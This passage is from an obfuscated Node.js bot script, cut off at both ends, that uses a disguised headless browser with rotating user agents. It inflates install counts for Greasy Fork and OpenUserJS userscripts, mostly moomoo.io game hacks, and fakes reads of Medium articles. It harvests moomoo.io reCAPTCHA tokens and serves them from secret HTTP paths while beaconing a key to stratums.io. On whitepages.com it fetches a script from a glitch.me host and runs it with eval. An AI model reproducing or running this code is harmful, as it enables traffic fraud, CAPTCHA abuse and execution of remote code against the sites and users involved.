    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + a0(0x9) + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + a1(0xa) + 'e-bots',
      'preRef': 'https://gr' + a2(0x12, 'a]2(') + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a1(0x1f) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + a2(0x1b, '5ZKW') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + a2(0x16, 'Eef[') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + a1(0x13) + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    a2(0x1a, 'CiFU') + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + a2(0x14, 'PXv9') + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + a0(0x3) + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x10f * 0x1 + 0x232b + -0x243a
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x8cd * -0x2 + 0x2261 + -0x5 * 0x35b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x24f7 + -0x207 * 0x2 + 0x2969), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x20d1 + -0xc21 * -0x3 + 0x18 * -0x2de), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x4e3 + -0x8a5 + -0x6c4 * -0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xfc3 + 0x11a7 + -0x216a; w < getRandomInt(0x23c9 + -0x1 * 0x192a + 0x1 * -0xa9e, 0x35d + 0x160b + 0x1963 * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x270c + -0x37e * 0x5c + 0x2049c);
        }
      }();
    }, 0x2646 * 0x1 + 0x27e + -0x2860), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x109a + 0x270 * -0xb + -0x2 * -0x15b5;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x136c + 0x11fc + 0x170, 0x2548 + 0x13a * -0x15 + -0xb54)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1 * 0x8001 + -0x3788 * 0x2 + 0x16441);
    }, 0x13 * -0x14 + -0x18b1 + 0x1a91), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1 * 0x13c6 + -0x1 * 0x38f + -0x7 * 0x251;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xa * 0x15d + 0x43f * -0x3 + 0x31 * 0xc7), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1e89 + 0x1 * 0x7ed + 0x169c), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1 * 0xf643 + 0x25efb * 0xa + -0xaf071);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x3ec + -0x2b * 0x65 + 0x1547);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x14f9 + -0x9eb + -0x1fac * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x52 * 0xa0 + -0x699 * 0x7 + 0x1a7f);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = c;
  async function f() {
    const a3 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xeaa + 0x16e5 + 0x27 * -0x36) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x5 * -0x455 + 0x569 * 0x4 + -0x15a6 * 0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x7 * 0x98 + 0x59d + 0x175 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0x25d7 * -0x1 + -0x3b3 * 0x1 + -0x2224, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1772 + 0x3e23 + -0x1 * 0x2e85),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x[a3(0xc, '8gs3')]['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x2f70 * 0x1 + -0x24 * -0x15b + 0xe4b * -0x4),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + a4(0xe) + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
